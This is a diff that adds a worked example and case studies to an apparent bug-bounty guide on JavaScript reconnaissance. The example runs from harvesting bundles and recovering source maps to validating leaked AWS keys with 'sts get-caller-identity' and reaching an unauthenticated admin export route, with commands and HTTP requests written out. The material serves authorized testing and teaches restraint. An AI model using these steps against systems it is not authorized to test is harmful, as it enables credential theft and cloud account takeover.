@@ -394,6 +394,85 @@ A validated, privileged secret is the highest JS outcome — and frequently a **
 
 ---
 
+# 11.1 The full attack, end-to-end — bundle → source map → live secret → cloud takeover ⭐
+
+> *This is the flagship worked example — the whole JS-recon spine on the wire.* It deliberately shows the JS-distinct move (**recover the original source from a leftover `.map`, then find the real secret the minified bundle hid**) and the discipline that separates a paid report from a closed one (**rejecting the public keys everyone mis-reports**). Every value is a benign, redacted marker; nothing destructive is run on the target.
+
+**Target.** A React SPA at `app.target.com`. Goal: turn the JavaScript into a demonstrated Critical, not a wall of regex matches.
+
+**Step 1 — harvest every JS asset, current + historical (§3).**
+```bash
+$ katana -u https://app.target.com -d 3 -jc -kf all -silent | grep -Ei '\.js(\?|$)' | anew js_urls.txt
+$ echo app.target.com | gau --subs | grep -Ei '\.js(\?|$)' | anew js_urls.txt   # historical: old bundles keep live-but-rotated keys
+$ wc -l js_urls.txt
+73 js_urls.txt
+$ while read u; do curl -s -L --max-time 20 -A 'Mozilla/5.0' "$u" \
+    -o "out/js/$(echo "$u"|md5sum|cut -c1-12)_$(basename "${u%%\?*}")"; done < js_urls.txt
+```
+
+**Step 2 — beautify + mine secrets, then REJECT the public keys (the discipline, §5/§17).**
+```bash
+$ npx js-beautify -r out/js/*.js >/dev/null
+$ python3 poc/secret_scan.py -d out/js -o secrets.txt && cat secrets.txt
+[LOW ]  google_api_key   AIzaSyB9x...Qk   out/js/..._main.js   # client Maps/Firebase key — domain-restricted, PUBLIC BY DESIGN
+[LOW ]  stripe_pub       pk_live_51H...     out/js/..._main.js   # PUBLISHABLE key — cannot charge/read — NOT the secret key
+[LOW ]  sentry_dsn       https://a1@o12.ingest.sentry.io/3   # DSN belongs in client code
+```
+Three matches, **three auto-rejects.** A less-disciplined hunter files "AWS-of-Google API key exposed!" here and gets closed Informational (§17 rows 1–3). The Google key is domain-locked and public by design; the Stripe key is *publishable* (`pk_`, not `sk_`); the Sentry DSN is meant to ship. **None is a finding.** The real secret isn't in the minified bundle — so I go get the source.
+
+**Step 3 — the JS-distinct move: recover the original source from a leftover source map (§9).**
+```bash
+$ tail -c 120 out/js/..._main.js
+//# sourceMappingURL=main.7f3a9c.js.map
+$ curl -s -o main.map -w '%{http_code}\n' https://app.target.com/static/js/main.7f3a9c.js.map
+200                                            # the map shipped to production — jackpot
+$ python3 poc/sourcemap_unpack.py -f main.map -o out/src && find out/src -name '*.ts' | head
+out/src/config/aws.ts
+out/src/api/internalRoutes.ts
+out/src/features/adminExport.tsx
+```
+The `.map` reconstructs the **original commented TypeScript** the minifier destroyed. Now I re-mine the *recovered* source (far higher signal than the bundle):
+```bash
+$ grep -RniE '(secret|password|todo|fixme|internal|admin)' out/src/config out/src/api
+out/src/config/aws.ts:7:  // TODO: move signing to the backend before launch — do NOT ship these
+out/src/config/aws.ts:8:  const AWS_ACCESS_KEY_ID = "AKIAY44XT7EXAMPLE7";
+out/src/config/aws.ts:9:  const AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
+out/src/api/internalRoutes.ts:22:  export const ADMIN_EXPORT = "/api/internal/admin/export";  // not linked in UI
+```
+A developer's own `// TODO: … do NOT ship these` comment sitting next to a **server** AWS key pair — the thing the minified bundle hid, and a hidden admin route as a bonus.
+
+**Step 4 — validate the secret is LIVE + PRIVILEGED, read-only, then STOP (§10).**
+```bash
+$ AWS_ACCESS_KEY_ID=AKIAY44XT7EXAMPLE7 \
+  AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \
+  aws sts get-caller-identity
+{
+  "UserId":  "AIDAY44XT7EXAMPLE7Q",
+  "Account": "123456789012",
+  "Arn":     "arn:aws:iam::123456789012:user/app-prod-backend"
+}
+```
+`get-caller-identity` is the **gold-standard non-destructive proof**: it returns 200 with the principal, proving the key is **live** and tied to a **production backend IAM user** — without reading a single byte of customer data. That one line is a complete Critical. I do **not** enumerate S3, list secrets, or call any write API.
+
+**Step 5 — name the ceiling (don't detonate it).** The principal `user/app-prod-backend` implies compute/deploy scope; a live prod AWS identity typically reaches a run-command surface (SSM `SendCommand` / a Lambda deploy) = **cloud shell / RCE** (§11). On a bug-bounty target that's the *reported* impact — I state it, backed by the identity proof, and **stop there.** (On an authorized engagement I'd prove one benign command on my own resource, then stop.)
+
+**Step 6 — the bonus authz finding (one own-vs-own check, §14).** The hidden `/api/internal/admin/export` route, tested with my **normal** low-priv session:
+```http
+GET /api/internal/admin/export HTTP/1.1
+Host: app.target.com
+Cookie: session=<my own low-priv account>
+```
+```
+HTTP/1.1 200 OK
+Content-Disposition: attachment; filename="all_users_export.csv"
+id,email,role,...
+```
+The server never enforced authorization on the route the UI simply never links — a **broken-access-control** finding in its own right (§14, CWE-862). One request proves it; I do **not** exfiltrate the CSV.
+
+**Why this is the JS-recon spine.** Nothing here was found by fuzzing the server. The bundle was a lead; the **source map** turned it into the real secret; **read-only validation** turned the secret into a proven Critical; and the same recovered source handed over a second bug for free. Harvest → recover → validate → name-the-ceiling → stop.
+
+---
+
 # 12. JS Sink → DOM XSS → Account Takeover
 
 A confirmed source→sink flow is **DOM XSS**, exploitable with no server bug.
@@ -628,6 +707,22 @@ nuclei -l js_urls.txt -tags exposure,token -o nuclei_js.txt
 □ Diff historical vs current JS for removed-but-live endpoints/keys and pre-fix vulnerable code.
 □ Service-worker / cache manifest → more hidden URLs and an offline persistence foothold.
 ```
+
+---
+
+# 23. Real-world JS-recon case studies (verified)
+
+> Facts below were re-verified against primary sources (linked in Appendix C) — not memory.
+
+- **JSluice and the shift from regex to AST (BishopFox, July 2023).** BishopFox released **JSluice** with the thesis that *"discovering secrets in JavaScript can be like mining for gold."* Its key advance over regex tools is that it parses JS with **tree-sitter (an AST)** — so it understands **string concatenation** and resolves runtime-built URLs (replacing unknowable pieces with `EXPR`) instead of matching flat text. Lesson for the tester: minified/obfuscated bundles *build* endpoints and keys at runtime; AST-aware tooling (`jsluice`, `ast-grep`) recovers what a `grep` regex silently misses. This is why §4 and the arsenal push AST search alongside regex.
+
+- **The Firebase web-config trap — the #1 mis-report, and where it's actually a bug.** A Firebase `apiKey` (`AIza…`) embedded in JS is **public by design** — it only identifies the project and grants no privileged access on its own, so reporting the key itself is closed Informational (§17 row 1). The *real* bug is what the config lets you reach when **security rules are misconfigured**: anonymous read/write to Firestore / Realtime Database / Storage. Documented real-world impact from that class includes exposed private chat logs, user geolocation, and internal secrets via Remote Config — consistently among the most common findings in mobile/JS bug-bounty work. The takeaway is the whole kit's thesis: **the key is a lead; the misconfigured resource it unlocks is the finding.**
+
+- **Production source maps reverse the whole frontend (a recurring disclosed class).** Shipping `.js.map` (or webpack `sourcesContent`) to production is a widespread, repeatedly-disclosed misconfiguration — Chrome DevTools even auto-loads them, so the original commented source is one panel away. Its value is rarely the map itself (often rated Low alone) but **everything it reveals**: developer `// TODO`/secret comments, dead admin code, internal hostnames, and the real (server) secrets the minifier obscured — exactly the §11.1 chain. Always try `<bundle>.js.map` even when nothing references it.
+
+- **`postMessage` handlers with no origin check — cross-origin DOM-XSS in big-name apps.** A `window.addEventListener('message', …)` handler that reads `event.data` into a sink (`innerHTML`/`eval`) **without validating `event.origin`** has produced real cross-origin DOM-XSS and data-theft bugs across widely-used web apps; it's a staple of PortSwigger's DOM-XSS/DOM-Invader research because it's both common and easy to miss by fuzzing (you can only find it by *reading* the JS). Any site that can frame or `window.open` the target then scripts into it → ATO of logged-in visitors, no server bug required (§12).
+
+- **Historical JS keeps live-but-"rotated" secrets and removed endpoints (the gau/waybackurls ecosystem).** The standard JS-harvest toolchain (**gau / waybackurls / katana**, from tomnomnom's and ProjectDiscovery's ecosystems) pulls **archived** bundles from the Wayback Machine and CommonCrawl. Old bundles routinely contain keys the team "rotated" but never actually revoked, and endpoints deleted from the UI that still answer on the server — which is why §3 treats historical harvesting as a first-class source, not an afterthought. Diffing current vs archived JS is one of the highest-yield, lowest-noise recon moves.
 
 ---
 
